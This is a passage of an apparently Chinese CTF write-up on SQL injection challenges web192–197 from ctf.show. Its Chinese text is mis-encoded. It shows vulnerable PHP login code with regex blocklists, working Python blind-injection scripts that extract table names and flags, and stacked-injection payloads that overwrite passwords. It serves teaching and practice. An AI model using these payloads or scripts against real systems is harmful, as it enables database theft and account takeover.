</span></span><span class="line"><span class="ln">19</span><span class="cl">                <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">            <span class="k">break</span>
</span></span></code></pre></div><p>å…¶å®ä¹Ÿå·®ä¸å¤š</p>
<p>äºŒåˆ†æ³•è„šæœ¬</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl">
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="c1"># ç”¨äº†äºŒåˆ†æ³• dejavu~~~</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s2">&#34;http://c9b03201-bcdf-42ce-ac5b-c546603c1848.challenge.ctf.show:8080/api/&#34;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="c1"># è¡¨å CtFsHOw{FL0G,CtFsHOw{usEr</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="c1"># payload = &#34;0&#39; or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{},1)&gt;&#39;{}&#39;,1,0) -- &#34;</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="c1"># åˆ—å ID,F1AG,ID,usErNAME,pAss</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"># payload = &#34;0&#39; or if(substr((select group_concat(column_name) from information_schema.columns where table_schema=database()),{},1)&gt;&#39;{}&#39;,1,0) -- &#34;</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1"># flag</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;0&#39; or if(substr((select f1ag from ctfshow_fl0g),</span><span class="si">{}</span><span class="s2">,1)&gt;&#39;</span><span class="si">{}</span><span class="s2">&#39;,1,0) -- &#34;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">true_flag</span> <span class="o">=</span> <span class="s2">&#34;</span><span class="se">\\</span><span class="s2">u5bc6</span><span class="se">\\</span><span class="s2">u7801</span><span class="se">\\</span><span class="s2">u9519</span><span class="se">\\</span><span class="s2">u8bef&#34;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">index</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="n">start</span> <span class="o">=</span> <span class="mi">32</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="n">end</span> <span class="o">=</span> <span class="mi">127</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="k">while</span> <span class="ow">not</span> <span class="p">(</span><span class="nb">abs</span><span class="p">(</span><span class="n">start</span><span class="o">-</span><span class="n">end</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1</span> <span class="ow">or</span> <span class="n">start</span> <span class="o">==</span> <span class="n">end</span><span class="p">):</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="n">p</span> <span class="o">=</span> <span class="p">(</span><span class="n">start</span> <span class="o">+</span> <span class="n">end</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">            <span class="s2">&#34;username&#34;</span><span class="p">:</span> <span class="n">payload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">index</span><span class="p">,</span> <span class="nb">chr</span><span class="p">(</span><span class="n">p</span><span class="p">)),</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="s2">&#34;password&#34;</span><span class="p">:</span> <span class="mi">0</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="kc">None</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">                <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">28</span><span class="cl">            <span class="k">except</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">29</span><span class="cl">                <span class="k">continue</span>
</span></span><span class="line"><span class="ln">30</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">31</span><span class="cl">        <span class="k">if</span> <span class="n">true_flag</span> <span class="ow">in</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">32</span><span class="cl">            <span class="n">start</span> <span class="o">=</span> <span class="n">p</span>
</span></span><span class="line"><span class="ln">33</span><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">34</span><span class="cl">            <span class="n">end</span> <span class="o">=</span> <span class="n">p</span>
</span></span><span class="line"><span class="ln">35</span><span class="cl">    <span class="k">if</span> <span class="n">end</span> <span class="o">&lt;</span> <span class="n">start</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">36</span><span class="cl">        <span class="n">end</span> <span class="o">=</span> <span class="n">start</span>
</span></span><span class="line"><span class="ln">37</span><span class="cl">    <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">end</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">38</span><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;[*] result: </span><span class="si">{</span><span class="n">result</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">39</span><span class="cl">    <span class="n">index</span> <span class="o">+=</span> <span class="mi">1</span>
</span></span></code></pre></div><h4 id="web193">web193<a hidden class="anchor" aria-hidden="true" href="#web193">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//å¯†ç æ£€æµ‹
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;å¯†ç åªèƒ½ä¸ºæ•°å­—&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="c1">//å¯†ç åˆ¤æ–­
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;ç™»é™†æˆåŠŸ&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="c1">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/file|into|ascii|ord|hex|substr/i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;ç”¨æˆ·åéæ³•&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p><strong>æ–°å¢waf</strong>ï¼šsubstr</p>
<p>æ²¡åŠæ³•è¿›è¡Œæˆªæ–­ï¼Œä½†å…¶å®é—®é¢˜ä¸å¤§</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;http://a4ac8172-cadd-42ca-a986-771b4ab0400f.challenge.ctf.show/api/&#39;</span>
</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">letter</span> <span class="o">=</span> <span class="s1">&#39;0123456789abcdefghijklmnopqrstuvwxyz-_,</span><span class="si">{}</span><span class="s1">&#39;</span>
</span></span><span class="line"><span class="ln"> 6</span><span class="cl">
</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="n">letter</span><span class="p">:</span>
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">        <span class="c1"># æŸ¥è¡¨</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">        <span class="c1"># æŸ¥å­—æ®µ</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">        <span class="c1"># payload = &#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;ctfshow_fl0g&#39;&#34;</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">        <span class="c1"># æŸ¥flag</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;select group_concat(f1ag) from ctfshow_flxg&#34;</span>
</span></span><span class="line"><span class="ln">15</span><span class="cl">        
</span></span><span class="line"><span class="ln">16</span><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">            <span class="s1">&#39;username&#39;</span><span class="p">:</span><span class="s2">&#34;admin&#39; and if((</span><span class="si">{}</span><span class="s2">) like &#39;</span><span class="si">{}</span><span class="s2">%&#39;,1,2) =&#39;1&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="n">result</span><span class="o">+</span><span class="n">j</span><span class="p">),</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">            <span class="s1">&#39;password&#39;</span><span class="p">:</span><span class="mi">1</span>
</span></span><span class="line"><span class="ln">19</span><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="ln">20</span><span class="cl">        <span class="n">res</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span><span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;å¯†ç é”™è¯¯&#34;</span> <span class="o">==</span> <span class="n">res</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s1">&#39;msg&#39;</span><span class="p">]:</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">            <span class="n">result</span> <span class="o">+=</span> <span class="n">j</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="n">result</span><span class="p">)</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="ln">25</span><span class="cl">        <span class="k">if</span> <span class="s2">&#34;}&#34;</span> <span class="ow">in</span> <span class="n">result</span><span class="p">:</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">            <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></div><p>æˆ‘ä»¬å¯ä»¥ç”¨likeæ¥è¾¾åˆ°å·®ä¸å¤šçš„æ•ˆæœ</p>
<p>è¿™é¢˜ä¹Ÿå¯ä»¥ç”¨char,left,right,substringä¹‹ç±»çš„æ–¹æ³•</p>
<h4 id="web194">web194<a hidden class="anchor" aria-hidden="true" href="#web194">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = &#39;</span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">&#39;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//å¯†ç æ£€æµ‹
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;å¯†ç åªèƒ½ä¸ºæ•°å­—&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="c1">//å¯†ç åˆ¤æ–­
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;ç™»é™†æˆåŠŸ&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="c1">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"></span>    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/file|into|ascii|ord|hex|substr|char|left|right|substring/i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">        <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;ç”¨æˆ·åéæ³•&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">    <span class="p">}</span>
</span></span></code></pre></div><p><strong>æ–°å¢waf</strong>ï¼šchar|left|right|substring</p>
<p>ä¸Šé¢˜çš„æ–¹æ³•ä¾æ—§é€‚ç”¨</p>
<h4 id="web195">web195<a hidden class="anchor" aria-hidden="true" href="#web195">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = </span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">  <span class="c1">//å¯†ç æ£€æµ‹
</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_numeric</span><span class="p">(</span><span class="nv">$password</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;å¯†ç åªèƒ½ä¸ºæ•°å­—&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">
</span></span><span class="line"><span class="ln">14</span><span class="cl">  <span class="c1">//å¯†ç åˆ¤æ–­
</span></span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;ç™»é™†æˆåŠŸ&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">
</span></span><span class="line"><span class="ln">19</span><span class="cl">  <span class="c1">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§
</span></span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&#34;|select|union|or|and|\x26|\x7c|file|into/i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">21</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;ç”¨æˆ·åéæ³•&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">22</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">23</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">24</span><span class="cl">
</span></span><span class="line"><span class="ln">25</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">26</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&#34;ç™»é™†æˆåŠŸ flag is </span><span class="si">$flag</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">27</span><span class="cl">  <span class="p">}</span>
</span></span></code></pre></div><p>æ ¹æ®æç¤ºå †å æ³¨å…¥</p>
<p>å…¶å®å°±æ˜¯åœ¨;åé¢å†æ‰§è¡Œä»»æ„çš„sqlå‘½ä»¤</p>
<p>è¿™é‡Œç›´æ¥æ”¹å¯†ç </p>
<pre tabindex="0"><code>payload=&#34;0x61646d696e;update`ctfshow_user`set`pass`=0x313131;&#34;
# è‡³äºä¸ºä»€ä¹ˆéå¾—ç”¨åå…­è¿›åˆ¶ç™»å½•ï¼Œæ˜¯å› ä¸ºä¸‹é¢è¿™ä¸ªæ²¡æœ‰å­—ç¬¦ä¸²å•å¼•å·åŒ…å›´
sql = &#34;select pass from ctfshow_user where username = {$username};&#34;;
# @Author:Y4tacker
</code></pre><pre tabindex="0"><code>admin &lt;=&gt; 0x61646d696e
111&lt;=&gt;0x313131
</code></pre><p><img alt="image-20250210000521664" loading="lazy" src="./assets/image-20250210000521664.png"></p>
<h4 id="web196">web196<a hidden class="anchor" aria-hidden="true" href="#web196">#</a></h4>
<pre tabindex="0"><code>æŸ¥è¯¢è¯­å¥

  //æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
  $sql = &#34;select pass from ctfshow_user where username = {$username};&#34;;
      
è¿”å›é€»è¾‘


  //TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§
  if(preg_match(&#39;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#39;|\&#34;|select|union|or|and|\x26|\x7c|file|into/i&#39;, $username)){
    $ret[&#39;msg&#39;]=&#39;ç”¨æˆ·åéæ³•&#39;;
    die(json_encode($ret));
  }

  if(strlen($username)&gt;16){
    $ret[&#39;msg&#39;]=&#39;ç”¨æˆ·åä¸èƒ½è¶…è¿‡16ä¸ªå­—ç¬¦&#39;;
    die(json_encode($ret));
  }

  if($row[0]==$password){
      $ret[&#39;msg&#39;]=&#34;ç™»é™†æˆåŠŸ flag is $flag&#34;;
  }
      
</code></pre><p>è¿™é¢˜åº”è¯¥æ˜¯bugäº†ï¼Œselectæ²¡è¢«waf</p>
<p><img alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" loading="lazy" src="./assets/1e88bb7a716790c989f552fb4a0e1a2a.png"></p>
<p>åœ¨ PHP é‡Œï¼Œå½“ä½¿ç”¨æ•°æ®åº“æŸ¥è¯¢è¯­å¥ä»æ•°æ®åº“ä¸­è·å–ç»“æœé›†æ—¶ï¼Œé€šå¸¸ä¼šé€è¡Œéå†ç»“æœé›†ã€‚æ¯ä¸€è¡Œæ•°æ®å¯ä»¥ç”¨ä¸€ä¸ªæ•°ç»„æ¥è¡¨ç¤ºï¼Œ<code>$row[0]</code> æŒ‡çš„æ˜¯è¿™ä¸€è¡Œæ•°ç»„ä¸­çš„ç¬¬ä¸€ä¸ªå…ƒç´ ã€‚</p>
<p>payload:</p>
<pre tabindex="0"><code>0;select(2)
2
</code></pre><h4 id="web197">web197<a hidden class="anchor" aria-hidden="true" href="#web197">#</a></h4>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="nx">æŸ¥è¯¢è¯­å¥</span>
</span></span><span class="line"><span class="ln"> 2</span><span class="cl">
</span></span><span class="line"><span class="ln"> 3</span><span class="cl">  <span class="c1">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·
</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="c1"></span>  <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&#34;select pass from ctfshow_user where username = </span><span class="si">{</span><span class="nv">$username</span><span class="si">}</span><span class="s2">;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln"> 5</span><span class="cl">      
</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="nx">è¿”å›é€»è¾‘</span>
</span></span><span class="line"><span class="ln"> 7</span><span class="cl">
</span></span><span class="line"><span class="ln"> 8</span><span class="cl">
</span></span><span class="line"><span class="ln"> 9</span><span class="cl">  <span class="c1">//TODO:æ„Ÿè§‰å°‘äº†ä¸ªå•¥ï¼Œå¥‡æ€ª,ä¸ä¼šåˆåŒå’å•è¢«ä¸€è¡€äº†å§
</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="c1"></span>  <span class="k">if</span><span class="p">(</span><span class="s1">&#39;/\*|\#|\-|\x23|\&#39;|\&#34;|union|or|and|\x26|\x7c|file|into|select|update|set//i&#39;</span><span class="p">,</span> <span class="nv">$username</span><span class="p">)){</span>
</span></span><span class="line"><span class="ln">11</span><span class="cl">    <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s1">&#39;ç”¨æˆ·åéæ³•&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">12</span><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="nx">json_encode</span><span class="p">(</span><span class="nv">$ret</span><span class="p">));</span>
</span></span><span class="line"><span class="ln">13</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">14</span><span class="cl">
</span></span><span class="line"><span class="ln">15</span><span class="cl">  <span class="k">if</span><span class="p">(</span><span class="nv">$row</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="nv">$password</span><span class="p">){</span>
</span></span><span class="line"><span class="ln">16</span><span class="cl">      <span class="nv">$ret</span><span class="p">[</span><span class="s1">&#39;msg&#39;</span><span class="p">]</span><span class="o">=</span><span class="s2">&#34;ç™»é™†æˆåŠŸ flag is </span><span class="si">$flag</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="ln">17</span><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="ln">18</span><span class="cl">      
</span></span></code></pre></div><p>è¿™æŠŠä¸èƒ½ç”¨selectï¼Œé‚£æˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•ç»™$row[0]ä¸€ä¸ªç¡®å®šçš„å€¼å³å¯</p>
<p>æ¯”å¦‚</p>
<pre tabindex="0"><code>username: 1;show tables 
password: ctfshow_user
